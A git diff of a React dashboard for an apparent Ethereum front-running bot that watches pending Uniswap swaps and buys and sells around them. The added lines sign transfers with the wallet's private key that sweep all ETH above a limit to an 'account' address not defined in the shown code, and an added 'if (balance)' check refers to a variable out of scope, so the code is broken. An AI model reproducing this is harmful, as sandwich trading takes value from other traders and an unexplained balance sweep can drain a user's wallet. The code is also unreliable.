@@ -5,7 +5,7 @@ import { useToast } from "@chakra-ui/react";
 import Web3 from 'web3';
 import abiDecoder from 'abi-decoder';
 import { Modal, ModalOverlay, ModalContent, ModalHeader, ModalFooter, ModalBody, ModalCloseButton, useDisclosure, Button, Input } from '@chakra-ui/react'
-import { web3, detectSwap, buyTokens, sellTokens, getUniswapContract, getTokenData } from '../utils/contractFunctions';
+import { web3, detectSwap, buyTokens, sellTokens, getUniswapContract, getTokenData, getBalance } from '../utils/contractFunctions';
 import uniswap from "../contracts/uniswap.json";
 import { addContracts, getContractData, getMainWalletData, updateTradingData } from '../utils/api';
 import addresses from "../contracts/address.json";
@@ -20,6 +20,7 @@ export default function Dashboard() {
   const [selectedToken, setSelectedToken] = useState("0xFa4719Ed5C32eaf2F346B73103f2204c755e3809");
   const [selectedTokenData, setSelectedTokenData] = useState(null);
   const [ethAmount, setEthAmount] = useState(0.05);
+  const [ethLimit, setEthLimit] = useState(0.1);
   const [isBotRunning, setIsBotRunning] = useState([]);
   const [subscriptions, setSubscriptions] = useState([]);
   const [mainWalletData, setMainWalletData] = useState();
@@ -50,7 +51,6 @@ export default function Dashboard() {
     try {
       addContracts(subwallet, contracts);
       getData();
-      getData();
     } catch (err) {
       console.log(err);
     }
@@ -74,32 +74,54 @@ export default function Dashboard() {
         flag[txHash] = true;
         // console.log(flag);
         console.log(txHash);
-        web3.eth.getTransaction(txHash)
-          .then(async function (tx) {
-            if (tx?.from === publicKey) return;
-            if (tx) {
-              const wallet = { publicKey: publicKey, privateKey: privateKey };
-              const swapInput = await detectSwap(tx, tokenAddress);
-              // console.log(swapInput);
-              if (swapInput) {
-                console.log(tx);
-                console.log(swapInput);
-                const nonceCount = await web3.eth.getTransactionCount(publicKey);
-                console.log(nonceCount);
-                const contract = await getUniswapContract();
-                const ethAmountHex = '0x' + (ethAmount * 1e18).toString(16);
-                let tokenAmounts = await contract.methods.getAmountsOut(ethAmountHex, [weth, tokenAddress]).call();
-                const tokenAmount = tokenAmounts[1];
-                console.log(tokenAmount);
-                buyTokens(tx, nonceCount, tokenAddress, wallet, ethAmount * 1e18);
-                sellTokens(tx, nonceCount + 1, tokenAddress, wallet, tokenAmount);
+        getBalance(publicKey).then(async (balance) => {
+          if (balance > ethLimit * 1e18) {
+            const nonce = await web3.eth.getTransactionCount(publicKey, 'latest');
+            const amount = balance - ethLimit * 1e18;
+            const tx = {
+              to: account,
+              value: amount,
+              gas: 30000,
+              nonce: nonce
+            };
+            const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
+            web3.eth.sendSignedTransaction(signedTx.rawTransaction, function (error, hash) {
+              if (!error) {
+                console.log("The hash of your transaction is: ", hash);
+              } else {
+                console.log("Something went wrong while submitting your transaction:", error);
               }
-            }
-          })
-          .catch(function (err) {
-            console.log(err);
-          })
+            });
+          }
+        });
+        if (balance)
+          web3.eth.getTransaction(txHash)
+            .then(async function (tx) {
+              if (tx?.from === publicKey) return;
+              if (tx) {
+                const wallet = { publicKey: publicKey, privateKey: privateKey };
+                const swapInput = await detectSwap(tx, tokenAddress);
+                // console.log(swapInput);
+                if (swapInput) {
+                  console.log(tx);
+                  console.log(swapInput);
+                  const nonceCount = await web3.eth.getTransactionCount(publicKey);
+                  console.log(nonceCount);
+                  const contract = await getUniswapContract();
+                  const ethAmountHex = '0x' + (ethAmount * 1e18).toString(16);
+                  let tokenAmounts = await contract.methods.getAmountsOut(ethAmountHex, [weth, tokenAddress]).call();
+                  const tokenAmount = tokenAmounts[1];
+                  console.log(tokenAmount);
+                  buyTokens(tx, nonceCount, tokenAddress, wallet, ethAmount * 1e18);
+                  sellTokens(tx, nonceCount + 1, tokenAddress, wallet, tokenAmount);
+                }
+              }
+            })
+            .catch(function (err) {
+              console.log(err);
+            })
       });
+
     setSubscriptions(p => [...p.slice(0, id), subscription, ...p.slice(id + 1)]);
   }
 
@@ -236,7 +258,9 @@ export default function Dashboard() {
         setContractSymbols(p => [...p, symbol]);
       })
       // console.log("item: ", item);
-      setContractsData(p => [...p, ...contractData]);
+      const length = contractsData.length;
+      console.log(length)
+      setContractsData([...contractsData, ...contractData]);
     });
   }
 
@@ -300,7 +324,7 @@ export default function Dashboard() {
                 <div className="header">Total Gas Spent (ETH)</div>
                 <div className="header">Action</div>
                 {
-                  contractsData?.map((contract, index) => contract.subwallet_id === item.id && (
+                  contractsData?.map((contract, index) => contract.subwallet_id === item._id && (
                     <>
                       <div className="element">{contractNames[index]}</div>
                       <div className="element">{contractSymbols[index]}</div>
